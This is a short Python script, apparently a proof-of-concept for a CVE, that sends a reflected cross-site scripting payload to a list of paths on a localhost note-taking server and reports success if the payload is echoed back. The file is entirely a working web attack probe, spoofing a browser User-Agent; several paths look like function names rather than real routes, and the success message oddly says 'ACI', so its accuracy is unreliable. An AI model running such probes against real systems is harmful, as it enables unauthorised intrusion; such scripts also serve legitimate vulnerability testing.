import requests

# Define the target URL where the vulnerable functions are expected to be
target_url = "http://localhost:8080"

# List of paths that are vulnerable according to the CVE description
vulnerable_paths = [
    "/api/note_revisions/downloadNoteRevision",
    "/share/routes/register",
    "/share/routes/renderNote",
    "/routes/custom/match.slice",
    "/routes/routes/route",
    "/routes/routes/send",
    "/services/auth/checkCredentials",
    "/services/auth/reject",
    "/api/files/downloadNoteFile",
    "/api/image/returnImage",
    "/api/export/exportBranch"
]

# Payload that attempts to exploit the XSS vulnerability
payload = "<script>alert('XSS');</script>"

# Headers to simulate a real user behavior
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

# Function to test each vulnerable path
def test_exploit():
    for path in vulnerable_paths:
        full_url = f"{target_url}{path}"
        response = requests.get(full_url, headers=headers, params={"input": payload})
        if payload in response.text:
            print("The ACI exploit success!!!")
            return
    print("The ACI exploit failed!!!")

# Run the exploit test
test_exploit()
